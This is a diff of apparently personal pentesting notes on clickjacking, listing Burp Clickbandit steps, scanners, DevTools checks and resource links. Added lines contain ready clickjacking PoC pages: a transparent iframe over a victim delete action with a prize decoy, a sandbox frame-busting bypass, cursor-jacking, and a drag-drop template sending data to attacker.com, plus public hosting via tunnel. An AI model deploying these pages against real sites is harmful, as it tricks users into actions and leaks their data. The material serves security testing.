@@ -26,18 +26,18 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Disponibilidad | Burp Pro built-in (Burp menu → Burp Clickbandit) | No en Community. |
-| Activar | Burp menu → Burp Clickbandit → "Copy Clickbandit to clipboard" | JS payload generated. |
-| Inyectar en target | Browser DevTools console → paste + enter en target page | Live recording. |
-| Grabar clicks | Click "Start" en panel Clickbandit → interact con target → "Finish" | Captura clicks reales. |
-| Generar PoC | "Save" → HTML autocontenido con iframe + decoy | Listo para servir. |
-| Ajustar overlay | Modal slide → mostrar real iframe vs decoy alternativo | Visualización. |
-| Test PoC | Open HTML local → verifica framing + click works | Validation. |
-| Output | Single HTML file con iframe + CSS overlay | Standalone PoC. |
-| Limitaciones | Requiere acceso a target (logged in si protected) | Auth needed sometimes. |
-| Combine con Repeater | Mod parámetros antes de re-record | Iterative. |
-| Combine con Match&Replace | Strip XFO/CSP en response → test framing local | Defeat-test. |
-| Ver framing logs | Proxy → HTTP history filter `frame-ancestors` o XFO | Detection assist. |
+| Burp Pro menu → "Burp Clickbandit" → "Copy Clickbandit to clipboard" | Generate JS Clickbandit payload | Pro feature. |
+| Browser DevTools console → paste Clickbandit payload + Enter | Inject Clickbandit into target page | Inject. |
+| Clickbandit panel → "Start" → interact with target → "Finish" | Record real clicks for PoC | Record clicks. |
+| Clickbandit panel → "Save" → download HTML PoC | Auto-generate standalone HTML PoC | Standalone PoC. |
+| Open generated HTML local → verify framing + click | Test PoC | Validate. |
+| Burp Proxy → HTTP history → filter `Response.matches("X-Frame-Options")` | Find responses con XFO | Filter. |
+| Burp Match & Replace rule: strip `X-Frame-Options:` response header | Strip XFO for local testing | Defeat-test. |
+| Burp Match & Replace rule: strip `Content-Security-Policy:` con frame-ancestors | Strip CSP for local testing | Defeat-test. |
+| Burp Repeater → modify params → re-run Clickbandit | Iterative PoC | Iterative. |
+| Burp BApp Store → "X-Frame-Options Detector" install | Auto detect XFO presence | Passive detect. |
+| Burp Active Scan → "Clickjacking" check enabled | Active framing audit | Active scan. |
+| Burp BCheck custom: `framing checker` | Pro v2023+ custom BCheck | Pro modern. |
 ^cj-tool-burp
 
 ### Workflow Clickbandit típico
@@ -45,11 +45,11 @@ linked:
 ```
 1. Burp Pro → Burp Clickbandit → "Copy Clickbandit to clipboard"
 2. Browser → navigate target → DevTools console (F12)
-3. Paste payload → enter
-4. UI Clickbandit aparece overlay → click "Start"
-5. Interactuar con sensitive action (click submit, drag, etc.)
-6. Click "Finish" → "Save" → HTML PoC descargado
-7. Servir HTML desde server atacante (o file://) → repro chain
+3. Paste payload → Enter
+4. UI Clickbandit overlay → click "Start"
+5. Interact with sensitive action
+6. Click "Finish" → "Save" → HTML PoC downloads
+7. Serve HTML from atacante server → repro chain
 ```
 
 ___
@@ -58,18 +58,28 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Burp Clickbandit | Auto-grabador | Realistic clicks-based. |
-| [PortSwigger Lab Generator](https://portswigger.net/web-security/clickjacking) | Templates educativos | Aprender variantes. |
-| Manual `<iframe + opacity>` | HTML básico | Full control. |
-| Manual `<iframe sandbox>` | Bypass JS frame-busting | Sandbox attribute trick. |
-| OWASP HTML5 PoC repos | GitHub variantes | Drag&drop, cursor jacking. |
-| `clickjacker.io` | Online (verificar disponibilidad) | Quick PoC. |
-| ZAP HUD overlay scanner | OWASP ZAP equivalent | Open-source alternative. |
-| ClickjackerGen (CLI) | Generate HTML from URL | Bulk PoC. |
-| Burp Repeater + manual HTML | Custom flexibilidad | Cualquier escenario. |
-| Drag & drop template | Use `ondragstart` exfiltrar | Variant. |
-| Cursor jacking template | CSS `cursor:none` + fake cursor | Variant. |
-| Multi-step template | Decoy switches state mid-click | Complex. |
+| `git clone https://github.com/D4Vinci/Clickjacker && cd Clickjacker && python clickjacker.py -u https://target.com` | Clickjacker.py auto-PoC generator | CLI PoC gen. |
+| `cat > poc.html <<'EOF'
+<iframe src="https://victim.com/admin/delete" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.0001;z-index:9999"></iframe>
+<div style="position:absolute;top:300px;left:200px;background:red;color:white;padding:20px">CLAIM PRIZE</div>
+EOF` | Manual mínimo PoC inline | Manual baseline. |
+| `cat > poc-sandbox.html <<'EOF'
+<iframe src="https://victim.com/x" sandbox="allow-forms allow-same-origin" style="opacity:0.0001;..."></iframe>
+EOF` | Sandbox bypass template | Sandbox bypass. |
+| `cat > poc-drag.html <<'EOF'
+<div ondragover="event.preventDefault()" ondrop="fetch('//attacker.com/?d='+event.dataTransfer.getData('text'))">Drop</div>
+<iframe src="https://victim.com/profile" style="opacity:0.0001"></iframe>
+EOF` | Drag-drop exfil template | Drag template. |
+| `cat > poc-cursor.html <<'EOF'
+<style>body{cursor:none}.f{position:fixed;width:24px;height:24px;background:url(c.png);pointer-events:none}</style>
+<div class="f" id="c"></div><iframe src="//victim.com/x" style="opacity:0.0001"></iframe>
+<script>onmousemove=e=>{c.style.left=(e.clientX+100)+'px';c.style.top=(e.clientY+100)+'px'}</script>
+EOF` | Cursor-jacking template | Cursor template. |
+| `python3 -m http.server 80 --bind 0.0.0.0` (serve PoC) | Quick HTTP server PoC host | PoC host. |
+| `cloudflared tunnel --url http://localhost:80` (public expose) | Public expose PoC | Public test. |
+| `zaproxy -cmd -port 8080 -quickurl https://target -quickprogress` (ZAP CJ alerts) | OWASP ZAP passive CJ scan | Free alt. |
+| Burp BApp Store → "Clickjacker" install (community ext) | Burp clickjack PoC generator | BApp generator. |
+| `git clone https://github.com/UI-Redressing/uiredressing.github.io && cd uiredressing && python3 -m http.server` | UI Redressing repo with templates | Templates repo. |
 ^cj-tool-generators
 
 ### Template manual mínimo
@@ -105,18 +115,17 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| nuclei templates clickjacking | `nuclei -u https://target -t http/misconfiguration/clickjacking/` | Bulk header scan. |
-| nuclei missing-security-headers | `nuclei -u target -t http/misconfiguration/missing-sri.yaml` etc | Adjacent. |
-| `clickjacker` (Go CLI) | `clickjacker -u https://target -v` | XFO/CSP focused. |
-| WhatWeb plugin | `whatweb -v https://target` | Fingerprint + headers. |
-| curl manual | `curl -sI URL \| grep -iE 'frame-options\|frame-ancestors'` | Quick check. |
-| Wappalyzer browser ext | UI tab "Security" muestra headers | Visual. |
-| OWASP ZAP passive scan | Active scanner alerts en framing | Open-source. |
-| Burp passive scan (Pro) | Auto-flag missing XFO/CSP | Pro feature. |
-| `httpx -title -web-server` | Bulk subdomain headers | `subfinder \| httpx`. |
-| Custom Burp BCheck | `bchecks` script para framing | Pro v2023+. |
-| `xfo-checker` script | curl loop bulk | Custom shell. |
-| Headers Mozilla Observatory | `https://observatory.mozilla.org/?host=target` | Online grader. |
+| `nuclei -u https://target.com -t http/misconfiguration/clickjacking.yaml` | Nuclei CJ template scan | Auto detect. |
+| `nuclei -l urls.txt -t http/misconfiguration/ -tags clickjacking -severity medium,high` | Bulk CJ scan multi-host | Bulk. |
+| `curl -sI https://target.com/admin \| grep -iE 'x-frame-options\|content-security-policy.*frame-ancestors'` | CLI quick XFO/CSP check | Quick. |
+| `for p in /admin /api/x /login /profile; do echo "[$p]"; curl -sI "https://target.com$p" \| grep -iE 'x-frame\|frame-ancestors'; done` | Per-path XFO/CSP bulk | Per-path. |
+| `subfinder -d target.com -silent \| httpx -silent -mc 200 -title -web-server -tech-detect -path / \| while read line; do URL=$(echo "$line" \| awk '{print $1}'); H=$(curl -sI "$URL"); echo "$H" \| grep -qiE 'x-frame-options\|frame-ancestors' \|\| echo "[+] FRAMEABLE: $URL"; done` | Bulk subdomain + frameable filter | Bulk pipeline. |
+| `whatweb -v https://target.com \| grep -i frame` | WhatWeb fingerprint headers | Fingerprint. |
+| `httpx -l subs.txt -title -mc 200 -web-server -include-response -t 50 \| grep -B1 'frameable'` | httpx bulk header probe | Bulk httpx. |
+| `git clone https://github.com/iangcarroll/clickjacker && go run clickjacker.go -u https://target.com -v` | Clickjacker Go CLI XFO/CSP audit | Go CLI. |
+| `curl -s https://observatory.mozilla.org/api/v2/analyze?host=target.com \| jq` | Mozilla Observatory online grader | Online grader. |
+| `python3 securityheaders.py -u https://target.com` (custom) | Custom Python headers scanner | DIY. |
+| Burp Pro → Dashboard → "Site map" → right-click → "Engagement tools" → "Find scripts" filter "frame-busting" | Find frame-busting JS sources | Pro audit. |
 ^cj-tool-scanners
 
 ### Bulk recon pipeline
@@ -134,7 +143,6 @@ subfinder -d target.com -silent | \
   done
 
 # Bulk nuclei
-echo "https://target.com" > urls.txt
 nuclei -l urls.txt -t http/misconfiguration/clickjacking/ -severity medium,high
 ```
 
@@ -144,18 +152,18 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Test framing local | Console: `document.body.innerHTML+='<iframe src="URL">'` | Si carga → frameable. |
-| Inspect XFO en Network | Network tab → Response Headers | Direct check. |
-| CSP errors en Console | "Refused to frame" message | CSP blocking. |
-| Touch emulation | DevTools → device toolbar mobile | Test touchjacking. |
-| Disable JS test | Settings → Disable JavaScript → reload | Verify JS-only frame-busting. |
-| Cookie inspection | Application → Cookies | SameSite values. |
-| Storage view | Application → Local/Session Storage | Token check. |
-| Permissions panel | Settings → permissions → camera/mic state | WebRTC chain. |
-| Sources tab | Search en JS bundles `frame-buster` patterns | Code review. |
-| Coverage tab | Detect dead JS frame-busting | Optimization. |
-| Performance tab | Frame timing analysis | Touch jacking timing. |
-| Lighthouse audit | Best Practices → "frame-ancestors" | Auto-check. |
+| DevTools Console: `document.body.appendChild(Object.assign(document.createElement('iframe'),{src:'https://target.com/admin',style:'width:500px;height:300px'}))` | Live frame test in console | Quick test. |
+| DevTools Network tab → click row → "Response Headers" → check `X-Frame-Options` | Inspect XFO per request | Direct check. |
+| DevTools Console: filter "Refused to frame" message | CSP block diagnostic | CSP blocking. |
+| DevTools → Toggle Device Toolbar (Ctrl+Shift+M) → set mobile viewport | Touch emulation mobile | Mobile test. |
+| DevTools → Settings → Preferences → "Disable JavaScript" checkbox → reload | Verify JS-only frame-busting | JS-off test. |
+| DevTools → Application → Cookies → check SameSite attribute | Cookie SameSite inspect | SameSite. |
+| DevTools → Application → Local/Session Storage → check tokens | Token inventory | Token check. |
+| DevTools → Settings → ... → Permissions → camera/mic state | Permission state probe | WebRTC. |
+| DevTools → Sources → search bundle `top != self\|top.location\|frame.busting` | Find frame-buster patterns | Code review. |
+| `chrome --disable-web-security --user-data-dir=/tmp/chrome-cj` (no SOP) | Local Chrome no SOP debug | Local debug. |
+| DevTools → Lighthouse → "Best Practices" → check frame-ancestors | Lighthouse audit | Auto audit. |
+| DevTools → Performance → record clicks → analyze timing | Timing analysis touch | Performance. |
 ^cj-tool-devtools
 
 ___
@@ -164,18 +172,18 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| [PayloadsAllTheThings - Clickjacking](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking) | Templates, sandbox tricks | Foundation. |
-| [SecLists](https://github.com/danielmiessler/SecLists) | `Fuzzing/clickjacking-payloads.txt` | URL params auto-fill forms. |
-| [HackTricks - Clickjacking](https://book.hacktricks.xyz/pentesting-web/clickjacking) | Variantes + chains | Reference. |
-| [OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html) | Mitigations | Defense. |
-| HackerOne disclosed reports | Real-world PoCs | Bug bounty. |
-| Bugcrowd VRT | Severity guide | Scoring. |
-| OWASP Testing Guide | Clickjacking section | Methodology. |
-| MITRE ATT&CK | Initial Access references | Threat modeling. |
-| W3C UI Security | Working group docs | Spec evolution. |
-| BlackHat / DEF CON talks | Niemietz UI redressing | Academic depth. |
-| OWASP cheatsheet examples | Per-framework defense | Multi-stack. |
-| `xframeoptions-bypass.txt` custom | Custom payload list | Per-engagement. |
+| `git clone https://github.com/swisskyrepo/PayloadsAllTheThings && cat 'PayloadsAllTheThings/Clickjacking/README.md'` | PayloadsAllTheThings Clickjacking compendium | Foundation. |
+| `git clone https://github.com/danielmiessler/SecLists && cat seclists/Fuzzing/clickjacking-payloads.txt 2>/dev/null` | SecLists CJ payloads | Foundation. |
+| `wget https://book.hacktricks.xyz/pentesting-web/clickjacking.md` (en HTML) | HackTricks CJ guide | Reference. |
+| `wget https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.md` | OWASP CJ Defense Cheat Sheet | Defense. |
+| `gh search prs --owner hackerone "clickjacking" --state closed --limit 50` (or H1 directly) | Search disclosed H1 CJ reports | Real-world. |
+| `git clone https://github.com/UI-Redressing/uiredressing.github.io` | UI Redressing templates repo | Templates. |
+| `curl https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Clickjacking/Files/clickjack.html` | PayloadsAllTheThings sample PoC | Sample. |
+| `pip install bugbounty-h1-stats && bugbounty-h1-stats search "clickjacking"` (custom) | H1 stats CJ search | Stats. |
+| `grep -r "frame-ancestors\|X-Frame-Options" /etc/nginx/ /etc/apache2/ 2>/dev/null` | Local config grep defense | Defense audit. |
+| `curl -s https://owasp.org/www-community/attacks/Clickjacking \| html2text` | OWASP page extract | Reference. |
+| `git clone https://github.com/Bugcrowd/vulnerability-rating-taxonomy && grep -i clickjacking vrt.json` | Bugcrowd VRT severity | Scoring. |
+| `curl -s https://portswigger.net/web-security/clickjacking` | PortSwigger labs reference | PortSwigger. |
 ^cj-tool-wordlists
 
 ***
